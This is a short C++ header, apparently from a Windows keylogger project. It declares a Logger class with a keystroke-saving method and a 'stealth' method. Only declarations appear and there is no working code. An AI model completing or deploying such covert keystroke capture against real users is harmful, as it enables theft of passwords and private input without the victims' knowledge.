#ifndef LOGGER_H_
#define LOGGER_H_

#include "stdafx.h"
#include <fstream>
#include <iostream>
#include <Windows.h> 
#include <string>

class Logger {
public:
	Logger() {}
	int save(int key_stroke, char *file);
	void stealth();
};

#endif // LOGGER_H_

